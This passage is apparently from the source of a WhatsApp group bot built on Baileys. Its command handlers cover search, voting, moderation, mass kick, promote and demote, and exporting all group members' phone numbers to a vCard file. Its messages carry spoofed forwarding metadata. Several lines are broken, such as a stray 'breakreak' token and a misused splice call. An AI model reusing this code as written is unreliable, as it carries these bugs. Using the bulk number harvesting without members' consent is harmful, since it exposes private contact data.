          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionJid: XeonBotInc.parseMention(message),
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
      } else {
        replygcxeon('🔴 Error: No search results found.')
      }
    } catch (e) {
      console.error(e)
      replygcxeon('🔴 Error: We encountered a problem while processing the request.')
    }
  }
}
breakreak
			case 'yts': case 'ytsearch': {
  if (!text) return replygcxeon(`*Example :* ${prefix + command} title`);
  try {
let yts = require("yt-search")
    let search = await yts(text);
    let videos = search.all;
    console.log(videos)
    if (!videos || videos.length === 0) {
      replygcxeon('No video found');
      return;
    }
    // Choose between 1 and 5 videos at random
    const numVideos = Math.min(videos.length, Math.floor(Math.random() * 10) + 1);
    const selectedVideos = [];
    while (selectedVideos.length < numVideos) {
      const randomIndex = Math.floor(Math.random() * videos.length);
      const randomVideo = videos.splice(randomIndex, 1)[0]; // Avoid selecting the same videos
      selectedVideos.push(randomVideo);
    }
    let push = [];
    for (let i = 0; i < selectedVideos.length; i++) {
      let video = selectedVideos[i];
      let cap = `Title : ${video.title}`;
      const mediaMessage = await prepareWAMessageMedia({ image: { url: video.thumbnail } }, { upload: XeonBotInc.waUploadToServer });
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: cap
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          title: `Video ${i + 1}`,
          subtitle: '',
          hasMediaAttachment: true,
          ...mediaMessage
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              "name": "cta_copy",
              "buttonParamsJson": `{"display_text":"Copy Url","id":"1234","copy_code":"${video.url}"}`
            }
          ]
        })
      });
    }
    const msg = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: ownername
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: botname
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: push
            }),
            contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
          })
        }
      }
    }, {quoted:m});
    await XeonBotInc.relayMessage(m.chat, msg.message, {
      messageId: msg.key.id
    });
  } catch (e) {
    console.error(e);
    await replygcxeon(`Error`);
  }
}
break
			case 'wikipedia': case 'wiki': {
	if (!text) return replygcxeon(`Enter what you want to search for on Wikipedia`)
	
    try {
	const link =  await axios.get(`https://en.wikipedia.org/wiki/${text}`)
	const $ = cheerio.load(link.data)
	let wik = $('#firstHeading').text().trim()
	let resulw = $('#mw-content-text > div.mw-parser-output').find('p').text().trim()
	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `▢ *Wikipedia*

‣ Title : ${wik}

${resulw}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await XeonBotInc.relayMessage(m.chat, msgs.message, {})
} catch (e) {
  replygcxeon('⚠️ No results found ')
}
}
break
			case 'google': {
if (!q) return replygcxeon(`Example : ${prefix + command} ${botname}`)
await XeonStickWait()
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replygcxeon(teks)
})
}
break
			case 'getjoinrequest':{
	if (!m.isGroup) return XeonStickGroup()
	if (!m.isBotAdmin) return XeonStickBotAdmin()
if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
	const response = await XeonBotInc.groupRequestParticipantsList(m.chat);
  if (!response || !response.length) {
    XeonBotInc.sendMessage(m.chat, {text: 'No pending join requests. ✅'}, {quoted:m});
    return;
  }
  let replyMessage = `${themeemoji} Join Request List:\n`;
  response.forEach((request, index) => {
    const { jid, request_method, request_time } = request;
    const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
    replyMessage += `\n*No.: ${index + 1} Request Details. 👇*`;
    replyMessage += `\n🧟‍♂️ *JID:* ${jid}`;
    replyMessage += `\n🧪 *Method:* ${request_method}`;
    replyMessage += `\n⏰ *Time:* ${formattedTime}\n`;
  });

  XeonBotInc.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
};
break
			case 'addbadword': case 'addbd':
               if (!XeonTheCreator) return XeonStickOwner()
               if (args.length < 1) return replygcxeon( `Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole`)
               bad.push(q)
               fs.writeFileSync('./src/badword.json', JSON.stringify(bad))
               replygcxeon('Successfully Added Bad Word!')
            break
            case 'delbadword': case 'deldb':
               if (!XeonTheCreator) return XeonStickOwner()
               if (args.length < 1) return replygcxeon( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`)                 
               bad.splice(q)
               fs.writeFileSync('./src/badword.json', JSON.stringify(bad))
               replygcxeon('Successfully Deleted Bad Word!')
            break 
            case 'listbadword':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of bad) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
replygcxeon(teks)
}
break
			case 'antibadword':
            case 'antitoxic':{
		         if (!m.isGroup) return XeonStickGroup()
if (!m.isBotAdmin) return XeonStickBotAdmin()
if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].badword = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].badword = false
                  replygcxeon(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antinsfw':
            case 'nsfw':{
		         if (!m.isGroup) return XeonStickGroup()
if (!m.isBotAdmin) return XeonStickBotAdmin()
if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].ntnsfw = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].ntnsfw = false
                  replygcxeon(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
			case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await XeonBotInc.fetchStatus(who)
    replygcxeon(bio.status)
  } catch {
    if (text) return replygcxeon(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await XeonBotInc.fetchStatus(who)
      replygcxeon(bio.status)
    } catch {
      return replygcxeon(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
        break
        case 'vote': {
            if (!m.isGroup) return XeonStickGroup()
            if (m.chat in vote) return replygcxeon(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
            if (!text) return replygcxeon(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
            replygcxeon(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            XeonBotInc.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return XeonStickGroup()
            if (!(m.chat in vote)) return replygcxeon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcxeon('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            XeonBotInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
                case 'downvote': {
            if (!m.isGroup) return XeonStickGroup()
            if (!(m.chat in vote)) return replygcxeon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcxeon('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            XeonBotInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
                 
case 'checkvote':
if (!m.isGroup) return XeonStickGroup()
if (!(m.chat in vote)) return replygcxeon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${XeonBotInc.user.id}
`
XeonBotInc.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return XeonStickGroup()
            if (!(m.chat in vote)) return replygcxeon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replygcxeon('Successfully Deleted Vote Session In This Group')
	    }
            break
break
			case 'closetime':
                if (!m.isGroup) return XeonStickGroup()
                if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
                if (!m.isBotAdmin) return XeonStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcxeon('*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
                }
                replygcxeon(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Close time* group closed by admin\nnow only admin can send messages`
                    XeonBotInc.groupSettingUpdate(m.chat, 'announcement')
                    replygcxeon(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return XeonStickGroup()
                if (!m.isAdmin && !XeonTheCreator) return replygcxeon(mess.admin)
                if (!m.isBotAdmin) return XeonStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcxeon('*select:*\nsecond\nminute\nhour\n\n*example*\n10 second')
                }
                replygcxeon(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Open time* the group was opened by admin\n now members can send messages`
                    XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement')
                    replygcxeon(open)
                }, timer)
                break
			case 'editinfo':{
                if (!m.isGroup) return XeonStickGroup()
                if (!m.isAdmins && !XeonTheCreator) return XeonStickAdmin()
                if (!m.isBotAdmin) return XeonStickBotAdmin()
                if (args[0] === 'open') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcxeon(`Successfully Opened Edit Group Info`))
                } else if (args[0] === 'close') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => replygcxeon(`Successfully Closed Edit Group Info`))
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
            break
			case 'getcontact': case 'getcon': {
if (!m.isGroup) return XeonStickGroup()
if (!(m.isAdmin || XeonTheCreator)) return XeonStickAdmin()
xeonbigpp = await XeonBotInc.sendMessage(m.chat, {
    text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000)
XeonBotInc.sendContact(m.chat, participants.map(a => a.id), xeonbigpp)
}
break
case 'savecontact': case 'svcontact':{
if (!m.isGroup) return XeonStickGroup()
if (!(m.isAdmin || XeonTheCreator)) return XeonStickAdmin()
let cmiggc = await XeonBotInc.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
replygcxeon('\nBe patient bro, saving... '+cmiggc.participants.length+' contact')
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
XeonBotInc.sendMessage(m.chat, {
    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\nSucceed\nGroup: *'+cmiggc.subject+'*\nContact: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
require('fs').unlinkSync(nmfilect)
}
break
case 'sendcontact': case 'sencontact': {
if (!m.isGroup) return XeonStickGroup()
if (!m.mentionedJid[0]) return replygcxeon('\nUse like this\n Example:.sendcontact @tag name')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
XeonBotInc.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case 'contacttag': case 'contag':{
if (!m.isGroup) return XeonStickGroup()
if (!(m.isAdmin || XeonTheCreator)) return XeonStickAdmin()
if (!m.mentionedJid[0]) return replygcxeon('\nUse like this\n Example:.contacttag @tag|name')
let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
XeonBotInc.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
}
break
			case 'kickall': {
 if (!m.isGroup) return XeonStickGroup()
 if (!m.isAdmins && !XeonTheCreator) return XeonStickAdmin()
 if (!m.isBotAdmin) return XeonStickBotAdmin()
  const xeonkickall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 if (global.db.groups[m.chat].welcome === true) {
 global.db.groups[m.chat].welcome = false;
  }
 for (let remove of xeonkickall) {
 await XeonBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
 await sleep(100);
 }
 replygcxeon(`Success`);
}
break
case 'promoteall': {
 if (!m.isGroup) return XeonStickGroup()
 if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 if (!m.isBotAdmin) return XeonStickBotAdmin()
  const xeonpromoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let promote of xeonpromoteall) {
 await XeonBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${promote}@s.whatsapp.net` : promote], "promote");
 await sleep(100);
 }
 replygcxeon(`Success`);
}
break
case 'demoteall': {
 if (!m.isGroup) return XeonStickGroup()
 if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
 if (!m.isBotAdmin) return XeonStickBotAdmin()
  const xeondemoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let demote of xeondemoteall) {
 await XeonBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${demote}@s.whatsapp.net` : demote], "demote");
 await sleep(100);
 }
 replygcxeon(`Success`);
}
break
			case 'ephemeral': {
                if (!m.isGroup) return XeonStickGroup()
                if (!m.isBotAdmin) return XeonStickBotAdmin()
                if (!m.isAdmin) return XeonStickAdmin()
                if (args[0] === 'on') {
                    await XeonBotInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                    await replygcxeon(`Done`)
                } else if (args[0] === 'off') {
                    await XeonBotInc.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    await replygcxeon(`Done`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
                
            }
            break
			case 'invite': {
	if (!m.isGroup) return XeonStickGroup()
	if (!m.isBotAdmin) return XeonStickBotAdmin()
if (!text) return replygcxeon(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 916909137213`)
if (text.includes('+')) return replygcxeon(`Enter the number together without *+*`)
if (isNaN(text)) return replygcxeon(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await XeonBotInc.groupInviteCode(group)
      await XeonBotInc.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        replygcxeon(` An invite link is sent to the user`) 
}
break
			case 'tagadmin': case 'listadmin': case 'admin':{
    	if (!m.isGroup) return XeonStickGroup()
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
*Group Admins:*
${listAdmin}
`.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Menu 🚀\",\"id\":\"${prefix}menu"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [...groupAdmins.map(v => v.id), owner],
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
